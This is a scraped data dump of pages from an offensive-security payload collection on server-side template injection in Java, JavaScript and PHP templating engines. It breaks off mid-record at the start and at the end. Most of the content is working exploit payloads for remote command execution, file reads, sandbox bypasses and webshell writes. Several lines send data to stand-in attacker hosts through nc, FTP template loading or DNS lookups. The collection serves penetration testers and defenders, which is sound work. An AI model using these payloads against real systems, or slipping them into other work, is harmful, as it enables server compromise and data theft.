2020](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/)\n", "timestamp": "2025-10-21T13:30:20.834302"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "Server Side Template Injection/Java.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md", "content": "# Server Side Template Injection - Java\n\n> Server-Side Template Injection (SSTI)  is a security vulnerability that occurs when user input is embedded into server-side templates in an unsafe manner, allowing attackers to inject and execute arbitrary code. In Java, SSTI can be particularly dangerous due to the power and flexibility of Java-based templating engines such as JSP (JavaServer Pages), Thymeleaf, and FreeMarker.\n\n## Summary\n\n- [Templating Libraries](#templating-libraries)\n- [Java](#java)\n    - [Java - Basic Injection](#java---basic-injection)\n    - [Java - Retrieve Environment Variables](#java---retrieve-environment-variables)\n    - [Java - Retrieve /etc/passwd](#java---retrieve-etcpasswd)\n- [Freemarker](#freemarker)\n    - [Freemarker - Basic Injection](#freemarker---basic-injection)\n    - [Freemarker - Read File](#freemarker---read-file)\n    - [Freemarker - Code Execution](#freemarker---code-execution)\n    - [Freemarker - Sandbox Bypass](#freemarker---sandbox-bypass)\n- [Codepen](#codepen)\n- [Jinjava](#jinjava)\n    - [Jinjava - Basic Injection](#jinjava---basic-injection)\n    - [Jinjava - Command Execution](#jinjava---command-execution)\n- [Pebble](#pebble)\n    - [Pebble - Basic Injection](#pebble---basic-injection)\n    - [Pebble - Code Execution](#pebble---code-execution)\n- [Velocity](#velocity)\n- [Groovy](#groovy)\n    - [Groovy - Basic Injection](#groovy---basic-injection)\n    - [Groovy - Read File](#groovy---read-file)\n    - [Groovy - HTTP Request:](#groovy---http-request)\n    - [Groovy - Command Execution](#groovy---command-execution)\n    - [Groovy - Sandbox Bypass](#groovy---sandbox-bypass)\n- [Spring Expression Language](#spring-expression-language)\n    - [SpEL - Basic Injection](#spel---basic-injection)\n    - [SpEL - DNS Exfiltration](#spel---dns-exfiltration)\n    - [SpEL - Session Attributes](#spel---session-attributes)\n    - [SpEL - Command Execution](#spel---command-execution)\n- [References](#references)\n\n## Templating Libraries\n\n| Template Name | Payload Format |\n| ------------ | --------- |\n| Codepen    | `#{}`     |\n| Freemarker | `${3*3}`, `#{3*3}`, `[=3*3]` |\n| Groovy     | `${9*9}`  |\n| Jinjava    | `{{ }}`   |\n| Pebble     | `{{ }}`   |\n| Spring     | `*{7*7}`  |\n| Thymeleaf  | `[[ ]]`   |\n| Velocity   | `#set($X=\"\") $X`             |\n\n## Java\n\n### Java - Basic Injection\n\n> Multiple variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.\n\n```java\n${7*7}\n${{7*7}}\n${class.getClassLoader()}\n${class.getResource(\"\").getPath()}\n${class.getResource(\"../../../../../index.htm\").getContent()}\n```\n\n### Java - Retrieve Environment Variables\n\n```java\n${T(java.lang.System).getenv()}\n```\n\n### Java - Retrieve /etc/passwd\n\n```java\n${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}\n\n${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}\n```\n\n---\n\n## Freemarker\n\n[Official website](https://freemarker.apache.org/)\n> Apache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data.\n\nYou can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)\n\n### Freemarker - Basic Injection\n\nThe template can be :\n\n- Default: `${3*3}`  \n- Legacy: `#{3*3}`\n- Alternative: `[=3*3]` since [FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)\n\n### Freemarker - Read File\n\n```js\n${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(\" \")}\nConvert the returned bytes to ASCII\n```\n\n### Freemarker - Code Execution\n\n```js\n<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")}\n[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}\n${\"freemarker.template.utility.Execute\"?new()(\"id\")}\n#{\"freemarker.template.utility.Execute\"?new()(\"id\")}\n[=\"freemarker.template.utility.Execute\"?new()(\"id\")]\n```\n\n### Freemarker - Sandbox Bypass\n\n:warning: only works on Freemarker versions below 2.3.30\n\n```js\n<#assign classloader=article.class.protectionDomain.classLoader>\n<#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")>\n<#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)>\n<#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>\n${dwf.newInstance(ec,null)(\"id\")}\n```\n\n---\n\n## Codepen\n\n[Official website](https://codepen.io/)\n>\n\n```python\n- var x = root.process\n- x = x.mainModule.require\n- x = x('child_process')\n= x.exec('id | nc attacker.net 80')\n```\n\n```javascript\n#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}\n```\n\n---\n\n## Jinjava\n\n[Official website](https://github.com/HubSpot/jinjava)\n> Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).\n\n### Jinjava - Basic Injection\n\n```python\n{{'a'.toUpperCase()}} would result in 'A'\n{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206\n```\n\nJinjava is an open source project developed by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)\n\n### Jinjava - Command Execution\n\nFixed by [HubSpot/jinjava PR #230](https://github.com/HubSpot/jinjava/pull/230)\n\n```ps1\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"new java.lang.String('xxx')\\\")}}\n\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"whoami\\\\\\\"); x.start()\\\")}}\n\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"netstat\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}}\n\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"uname\\\\\\\",\\\\\\\"-a\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}}\n```\n\n---\n\n## Pebble\n\n[Official website](https://pebbletemplates.io/)\n\n> Pebble is a Java templating engine inspired by [Twig](./PHP.md#twig) and similar to the Python [Jinja](./Python.md#jinja2) Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.\n\n### Pebble - Basic Injection\n\n```java\n{{ someString.toUPPERCASE() }}\n```\n\n### Pebble - Code Execution\n\nOld version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`.\n\nNew version of Pebble :\n\n```java\n{% set cmd = 'id' %}\n{% set bytes = (1).TYPE\n     .forName('java.lang.Runtime')\n     .methods[6]\n     .invoke(null,null)\n     .exec(cmd)\n     .inputStream\n     .readAllBytes() %}\n{{ (1).TYPE\n     .forName('java.lang.String')\n     .constructors[0]\n     .newInstance(([bytes]).toArray()) }}\n```\n\n---\n\n## Velocity\n\n[Official website](https://velocity.apache.org/engine/1.7/user-guide.html)\n\n> Apache Velocity is a Java-based template engine that allows web designers to embed Java code references directly within templates.\n\nIn a vulnerable environment, Velocity's expression language can be abused to achieve remote code execution (RCE). For example, this payload executes the whoami command and prints the result:\n\n```java\n#set($str=$class.inspect(\"java.lang.String\").type)\n#set($chr=$class.inspect(\"java.lang.Character\").type)\n#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"whoami\"))\n$ex.waitFor()\n#set($out=$ex.getInputStream())\n#foreach($i in [1..$out.available()])\n$str.valueOf($chr.toChars($out.read()))\n#end\n```\n\nA more flexible and stealthy payload that supports base64-encoded commands, allowing execution of arbitrary shell commands such as `echo \"a\" > /tmp/a`. Below is an example with `whoami` in base64:\n\n```java\n#set($base64EncodedCommand = 'd2hvYW1p')\n\n#set($contextObjectClass = $knownContextObject.getClass())\n\n#set($Base64Class = $contextObjectClass.forName(\"java.util.Base64\"))\n#set($Base64Decoder = $Base64Class.getMethod(\"getDecoder\").invoke(null))\n#set($decodedBytes = $Base64Decoder.decode($base64EncodedCommand))\n\n#set($StringClass = $contextObjectClass.forName(\"java.lang.String\"))\n#set($command = $StringClass.getConstructor($contextObjectClass.forName(\"[B\"), $contextObjectClass.forName(\"java.lang.String\")).newInstance($decodedBytes, \"UTF-8\"))\n\n#set($commandArgs = [\"/bin/sh\", \"-c\", $command])\n\n#set($ProcessBuilderClass = $contextObjectClass.forName(\"java.lang.ProcessBuilder\"))\n#set($processBuilder = $ProcessBuilderClass.getConstructor($contextObjectClass.forName(\"java.util.List\")).newInstance($commandArgs))\n#set($processBuilder = $processBuilder.redirectErrorStream(true))\n#set($process = $processBuilder.start())\n#set($exitCode = $process.waitFor())\n\n#set($inputStream = $process.getInputStream())\n#set($ScannerClass = $contextObjectClass.forName(\"java.util.Scanner\"))\n#set($scanner = $ScannerClass.getConstructor($contextObjectClass.forName(\"java.io.InputStream\")).newInstance($inputStream))\n#set($scannerDelimiter = $scanner.useDelimiter(\"\\\\A\"))\n\n#if($scanner.hasNext())\n  #set($output = $scanner.next().trim())\n  $output.replaceAll(\"\\\\s+$\", \"\").replaceAll(\"^\\\\s+\", \"\")\n#end\n```\n\n---\n\n## Groovy\n\n[Official website](https://groovy-lang.org/)\n\n### Groovy - Basic injection\n\nRefer to [groovy-lang.org/syntax](https://groovy-lang.org/syntax.html) , but `${9*9}` is the basic injection.\n\n### Groovy - Read File\n\n```groovy\n${String x = new File('c:/windows/notepad.exe').text}\n${String x = new File('/path/to/file').getText('UTF-8')}\n${new File(\"C:\\Temp\\FileName.txt\").createNewFile();}\n```\n\n### Groovy - HTTP Request\n\n```groovy\n${\"http://www.google.com\".toURL().text}\n${new URL(\"http://www.google.com\").getText()}\n```\n\n### Groovy - Command Execution\n\n```groovy\n${\"calc.exe\".exec()}\n${\"calc.exe\".execute()}\n${this.evaluate(\"9*9\") //(this is a Script class)}\n${new org.codehaus.groovy.runtime.MethodClosure(\"calc.exe\",\"execute\").call()}\n```\n\n### Groovy - Sandbox Bypass\n\n```groovy\n${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"whoami\")})\ndef x }\n```\n\nor\n\n```groovy\n${ new groovy.lang.GroovyClassLoader().parseClass(\"@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\")})def x\") }\n```\n\n---\n\n## Spring Expression Language\n\n[Official website](https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html)\n\n> The Spring Expression Language (SpEL for short) is a powerful expression language that supports querying and manipulating an object graph at runtime. The language syntax is similar to Unified EL but offers additional features, most notably method invocation and basic string templating functionality.\n\n### SpEL - Basic Injection\n\n```java\n${7*7}\n${'patt'.toString().replace('a', 'x')}\n```\n\n### SpEL - DNS Exfiltration\n\nDNS lookup\n\n```java\n${\"\".getClass().forName(\"java.net.InetAddress\").getMethod(\"getByName\",\"\".getClass()).invoke(\"\",\"xxxxxxxxxxxxxx.burpcollaborator.net\")}\n```\n\n### SpEL - Session Attributes\n\nModify session attributes\n\n```java\n${pageContext.request.getSession().setAttribute(\"admin\",true)}\n```\n\n### SpEL - Command Execution\n\n- Method using `java.lang.Runtime` #1 - accessed with JavaClass\n\n    ```java\n    ${T(java.lang.Runtime).getRuntime().exec(\"COMMAND_HERE\")}\n    ```\n\n- Method using `java.lang.Runtime` #2\n\n    ```java\n    #{session.setAttribute(\"rtc\",\"\".getClass().forName(\"java.lang.Runtime\").getDeclaredConstructors()[0])}\n    #{session.getAttribute(\"rtc\").setAccessible(true)}\n    #{session.getAttribute(\"rtc\").getRuntime().exec(\"/bin/bash -c whoami\")}\n    ```\n\n- Method using `java.lang.Runtime` #3 - accessed with `invoke`\n\n    ```java\n    ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('COMMAND_HERE')}\n    ```\n\n- Method using `java.lang.Runtime` #3 - accessed with `javax.script.ScriptEngineManager`\n\n    ```java\n    ${request.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec(\\\\\\\"ping x.x.x.x\\\\\\\")\"))}\n    ```\n\n- Method using `java.lang.ProcessBuilder`\n\n    ```java\n    ${request.setAttribute(\"c\",\"\".getClass().forName(\"java.util.ArrayList\").newInstance())}\n    ${request.getAttribute(\"c\").add(\"cmd.exe\")}\n    ${request.getAttribute(\"c\").add(\"/k\")}\n    ${request.getAttribute(\"c\").add(\"ping x.x.x.x\")}\n    ${request.setAttribute(\"a\",\"\".getClass().forName(\"java.lang.ProcessBuilder\").getDeclaredConstructors()[0].newInstance(request.getAttribute(\"c\")).start())}\n    ${request.getAttribute(\"a\")}\n    ```\n\n## References\n\n- [Server Side Template Injection – on the example of Pebble - Michał Bentkowski - September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)\n- [Server-Side Template Injection: RCE For The Modern Web App - James Kettle (@albinowax) - December 10, 2015](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)\n- [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)\n- [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://www.youtube.com/watch?v=3cT0uE7Y87s)\n- [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)\n- [Bean Stalking: Growing Java beans into RCE - Alvaro Munoz - July 7, 2020](https://securitylab.github.com/research/bean-validation-RCE)\n- [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Peter M (@pmnh_) - December 4, 2022](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)\n- [Expression Language Injection - OWASP - December 4, 2019](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)\n- [Expression Language injection - PortSwigger - January 27, 2019](https://portswigger.net/kb/issues/00100f20_expression-language-injection)\n- [Leveraging the Spring Expression Language (SpEL) injection vulnerability (a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)\n- [RCE in Hubspot with EL injection in HubL - @fyoorer - December 7, 2018](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)\n- [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - January 29, 2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)\n", "timestamp": "2025-10-21T13:30:21.232826"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "Server Side Template Injection/JavaScript.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md", "content": "# Server Side Template Injection - JavaScript\n\n> Server-Side Template Injection (SSTI)  occurs when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In the context of JavaScript, SSTI vulnerabilities can arise when using server-side templating engines like Handlebars, EJS, or Pug, where user input is integrated into templates without adequate sanitization.\n\n## Summary\n\n- [Templating Libraries](#templating-libraries)\n- [Handlebars](#handlebars)\n    - [Handlebars - Basic Injection](#handlebars---basic-injection)\n    - [Handlebars - Command Execution](#handlebars---command-execution)\n- [Lodash](#lodash)\n    - [Lodash - Basic Injection](#lodash---basic-injection)\n    - [Lodash - Command Execution](#lodash---command-execution)\n- [References](#references)\n\n## Templating Libraries\n\n| Template Name | Payload Format |\n| ------------ | --------- |\n| DotJS        | `{{= }}`  |\n| DustJS       | `{}`      |\n| EJS          | `<% %>`   |\n| HandlebarsJS | `{{ }}`   |\n| HoganJS      | `{{ }}`   |\n| Lodash       | `{{= }}`  |\n| MustacheJS   | `{{ }}`   |\n| NunjucksJS   | `{{ }}`   |\n| PugJS        | `#{}`     |\n| TwigJS       | `{{ }}`   |\n| UnderscoreJS | `<% %>`   |\n| VelocityJS   | `#=set($X=\"\")$X` |\n| VueJS        | `{{ }}`   |\n\n## Handlebars\n\n[Official website](https://handlebarsjs.com/)\n> Handlebars compiles templates into JavaScript functions.\n\n### Handlebars - Basic Injection\n\n```js\n{{this}}\n{{self}}\n```\n\n### Handlebars - Command Execution\n\nThis payload only work in handlebars versions, fixed in [GHSA-q42p-pg8m-cqh6](https://github.com/advisories/GHSA-q42p-pg8m-cqh6):\n\n- `>= 4.1.0`, `< 4.1.2`\n- `>= 4.0.0`, `< 4.0.14`\n- `< 3.0.7`\n\n```handlebars\n{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').execSync('ls -la');\"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}\n```\n\n---\n\n## Lodash\n\n[Official website](https://lodash.com/docs/4.17.15)\n> A modern JavaScript utility library delivering modularity, performance & extras.\n\n### Lodash - Basic Injection\n\nHow to create a template:\n\n```javascript\nconst _ = require('lodash');\nstring = \"{{= username}}\"\nconst options = {\n  evaluate: /\\{\\{(.+?)\\}\\}/g,\n  interpolate: /\\{\\{=(.+?)\\}\\}/g,\n  escape: /\\{\\{-(.+?)\\}\\}/g,\n};\n\n_.template(string, options);\n```\n\n- **string:** The template string.\n- **options.interpolate:** It is a regular expression that specifies the HTML *interpolate* delimiter.\n- **options.evaluate:** It is a regular expression that specifies the HTML *evaluate* delimiter.\n- **options.escape:** It is a regular expression that specifies the HTML *escape* delimiter.\n\nFor the purpose of RCE, the delimiter of templates is determined by the **options.evaluate** parameter.\n\n```javascript\n{{= _.VERSION}}\n${= _.VERSION}\n<%= _.VERSION %>\n\n\n{{= _.templateSettings.evaluate }}\n${= _.VERSION}\n<%= _.VERSION %>\n```\n\n### Lodash - Command Execution\n\n```js\n{{x=Object}}{{w=a=new x}}{{w.type=\"pipe\"}}{{w.readable=1}}{{w.writable=1}}{{a.file=\"/bin/sh\"}}{{a.args=[\"/bin/sh\",\"-c\",\"id;ls\"]}}{{a.stdio=[w,w]}}{{process.binding(\"spawn_sync\").spawn(a).output}}\n```\n\n## References\n\n- [Exploiting Less.js to Achieve RCE - Jeremy Buis - July 1, 2021](https://web.archive.org/web/20210706135910/https://www.softwaresecured.com/exploiting-less-js/)\n- [Handlebars template injection and RCE in a Shopify app - Mahmoud Gamal - April 4, 2019](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)\n", "timestamp": "2025-10-21T13:30:21.330487"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "Server Side Template Injection/PHP.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md", "content": "# Server Side Template Injection - PHP\n\n> Server-Side Template Injection (SSTI)  is a vulnerability that occurs when an attacker can inject malicious input into a server-side template, causing the template engine to execute arbitrary commands on the server. In PHP, SSTI can arise when user input is embedded within templates rendered by templating engines like Smarty, Twig, or even within plain PHP templates, without proper sanitization or validation.\n\n## Summary\n\n- [Templating Libraries](#templating-libraries)\n- [Smarty](#smarty)\n- [Twig](#twig)\n    - [Twig - Basic Injection](#twig---basic-injection)\n    - [Twig - Template Format](#twig---template-format)\n    - [Twig - Arbitrary File Reading](#twig---arbitrary-file-reading)\n    - [Twig - Code Execution](#twig---code-execution)\n- [Latte](#latte)\n    - [Latte - Basic Injection](#latte---basic-injection)\n    - [Latte - Code Execution](#latte---code-execution)\n- [patTemplate](#pattemplate)\n- [PHPlib](#phplib-and-html_template_phplib)\n- [Plates](#plates)\n- [References](#references)\n\n## Templating Libraries\n\n| Template Name  | Payload Format |\n| -------------- | --------- |\n| Laravel Blade  | `{{ }}`   |\n| Latte          | `{var $X=\"\"}{$X}`   |\n| Mustache       | `{{ }}`   |\n| Plates         | `<?= ?>`  |\n| Smarty         | `{ }`     |\n| Twig           | `{{ }}`   |\n\n## Smarty\n\n[Official website](https://www.smarty.net/docs/en/)\n> Smarty is a template engine for PHP.\n\n```python\n{$smarty.version}\n{php}echo `id`;{/php} //deprecated in smarty v3\n{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}\n{system('ls')} // compatible v3\n{system('cat index.php')} // compatible v3\n```\n\n---\n\n## Twig\n\n[Official website](https://twig.symfony.com/)\n> Twig is a modern template engine for PHP.\n\n### Twig - Basic Injection\n\n```python\n{{7*7}}\n{{7*'7'}} would result in 49\n{{dump(app)}}\n{{dump(_context)}}\n{{app.request.server.all|join(',')}}\n```\n\n### Twig - Template Format\n\n```python\n$output = $twig > render (\n  'Dear' . $_GET['custom_greeting'],\n  array(\"first_name\" => $user.first_name)\n);\n\n$output = $twig > render (\n  \"Dear {first_name}\",\n  array(\"first_name\" => $user.first_name)\n);\n```\n\n### Twig - Arbitrary File Reading\n\n```python\n\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@\n{{include(\"wp-config.php\")}}\n```\n\n### Twig - Code Execution\n\n```python\n{{self}}\n{{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}}\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n{{['id']|filter('system')}}\n{{[0]|reduce('system','id')}}\n{{['id']|map('system')|join}}\n{{['id',1]|sort('system')|join}}\n{{['cat\\x20/etc/passwd']|filter('system')}}\n{{['cat$IFS/etc/passwd']|filter('system')}}\n{{['id']|filter('passthru')}}\n{{['id']|map('passthru')}}\n{{['nslookup oastify.com']|filter('system')}}\n```\n\nExample injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)\n\n```python\nFILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}\n```\n\nExample with an email passing FILTER_VALIDATE_EMAIL PHP.\n\n```powershell\nPOST /subscribe?0=cat+/etc/passwd HTTP/1.1\nemail=\"{{app.request.query.filter(0,0,1024,{'options':'system'})}}\"@attacker.tld\n```\n\n---\n\n## Latte\n\n### Latte - Basic Injection\n\n```php\n{var $X=\"POC\"}{$X}\n```\n\n### Latte - Code Execution\n\n```php\n{php system('nslookup oastify.com')}\n```\n\n---\n\n## patTemplate\n\n> [patTemplate](https://github.com/wernerwa/pat-template) non-compiling PHP templating engine, that uses XML tags to divide a document into different parts\n\n```xml\n<patTemplate:tmpl name=\"page\">\n  This is the main page.\n  <patTemplate:tmpl name=\"foo\">\n    It contains another template.\n  </patTemplate:tmpl>\n  <patTemplate:tmpl name=\"hello\">\n    Hello {NAME}.<br/>\n  </patTemplate:tmpl>\n</patTemplate:tmpl>\n```\n\n---\n\n## PHPlib and HTML_Template_PHPLIB\n\n[HTML_Template_PHPLIB](https://github.com/pear/HTML_Template_PHPLIB) is the same as PHPlib but ported to Pear.\n\n`authors.tpl`\n\n```html\n<html>\n <head><title>{PAGE_TITLE}</title></head>\n <body>\n  <table>\n   <caption>Authors</caption>\n   <thead>\n    <tr><th>Name</th><th>Email</th></tr>\n   </thead>\n   <tfoot>\n    <tr><td colspan=\"2\">{NUM_AUTHORS}</td></tr>\n   </tfoot>\n   <tbody>\n<!-- BEGIN authorline -->\n    <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>\n<!-- END authorline -->\n   </tbody>\n  </table>\n </body>\n</html>\n```\n\n`authors.php`\n\n```php\n<?php\n//we want to display this author list\n$authors = array(\n    'Christian Weiske'  => 'cweiske@php.net',\n    'Bjoern Schotte'     => 'schotte@mayflower.de'\n);\n\nrequire_once 'HTML/Template/PHPLIB.php';\n//create template object\n$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');\n//load file\n$t->setFile('authors', 'authors.tpl');\n//set block\n$t->setBlock('authors', 'authorline', 'authorline_ref');\n\n//set some variables\n$t->setVar('NUM_AUTHORS', count($authors));\n$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));\n\n//display the authors\nforeach ($authors as $name => $email) {\n    $t->setVar('AUTHOR_NAME', $name);\n    $t->setVar('AUTHOR_EMAIL', $email);\n    $t->parse('authorline_ref', 'authorline', true);\n}\n\n//finish and echo\necho $t->finish($t->parse('OUT', 'authors'));\n?>\n```\n\n---\n\n## Plates\n\nPlates is inspired by Twig but a native PHP template engine instead of a compiled template engine.\n\ncontroller:\n\n```php\n// Create new Plates instance\n$templates = new League\\Plates\\Engine('/path/to/templates');\n\n// Render a template\necho $templates->render('profile', ['name' => 'Jonathan']);\n```\n\npage template:\n\n```php\n<?php $this->layout('template', ['title' => 'User Profile']) ?>\n\n<h1>User Profile</h1>\n<p>Hello, <?=$this->e($name)?></p>\n```\n\nlayout template:\n\n```php\n<html>\n  <head>\n    <title><?=$this->e($title)?></title>\n  </head>\n  <body>\n    <?=$this->section('content')?>\n  </body>\n</html>\n```\n\n## References\n\n- [Server Side Template Injection (SSTI) via Twig escape handler - March 21, 2024](https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58)\n", "timestamp": "2025-10-21T13:30:21.446157"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "Server Side Template Injection/Python.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md", "content": "# Server Side Template Injection - Python\n\n> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious input into a server-side template, causing arbitrary code execution on the server. In Python, SSTI can occur when using templating engines such as Jinja2, Mako, or Django templates, where user input is included in templates without proper sanitization.\n\n## Summary\n\n- [Templating Libraries](#templating-libraries)\n- [Django](#django)\n    - [Django - Basic Injection](#django---basic-injection)\n    - [Django - Cross-Site Scripting](#django---cross-site-scripting)\n    - [Django - Debug Information Leak](#django---debug-information-leak)\n    - [Django - Leaking App's Secret Key](#django---leaking-apps-secret-key)\n    - [Django - Admin Site URL leak](#django---admin-site-url-leak)\n    - [Django - Admin Username and Password Hash Leak](#django---admin-username-and-password-hash-leak)\n- [Jinja2](#jinja2)\n    - [Jinja2 - Basic Injection](#jinja2---basic-injection)\n    - [Jinja2 - Template Format](#jinja2---template-format)\n    - [Jinja2 - Debug Statement](#jinja2---debug-statement)\n    - [Jinja2 - Dump All Used Classes](#jinja2---dump-all-used-classes)\n    - [Jinja2 - Dump All Config Variables](#jinja2---dump-all-config-variables)\n    - [Jinja2 - Read Remote File](#jinja2---read-remote-file)\n    - [Jinja2 - Write Into Remote File](#jinja2---write-into-remote-file)\n    - [Jinja2 - Remote Command Execution](#jinja2---remote-command-execution)\n        - [Forcing Output On Blind RCE](#jinja2---forcing-output-on-blind-rce)\n        - [Exploit The SSTI By Calling os.popen().read()](#exploit-the-ssti-by-calling-ospopenread)\n        - [Exploit The SSTI By Calling subprocess.Popen](#exploit-the-ssti-by-calling-subprocesspopen)\n        - [Exploit The SSTI By Calling Popen Without Guessing The Offset](#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)\n        - [Exploit The SSTI By Writing an Evil Config File](#exploit-the-ssti-by-writing-an-evil-config-file)\n    - [Jinja2 - Filter Bypass](#jinja2---filter-bypass)\n- [Tornado](#tornado)\n    - [Tornado - Basic Injection](#tornado---basic-injection)\n    - [Tornado - Remote Command Execution](#tornado---remote-command-execution)\n- [Mako](#mako)\n    - [Mako - Remote Command Execution](#mako---remote-command-execution)\n- [References](#references)\n\n## Templating Libraries\n\n| Template Name | Payload Format |\n| ------------ | --------- |\n| Bottle    | `{{ }}`  |\n| Chameleon | `${ }`   |\n| Cheetah   | `${ }`   |\n| Django    | `{{ }}`  |\n| Jinja2    | `{{ }}`  |\n| Mako      | `${ }`   |\n| Pystache  | `{{ }}`  |\n| Tornado   | `{{ }}`  |\n\n## Django\n\nDjango template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.\n\n### Django - Basic Injection\n\n```python\n{% csrf_token %} # Causes error with Jinja2\n{{ 7*7 }}  # Error with Django Templates\nih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r\n```\n\n### Django - 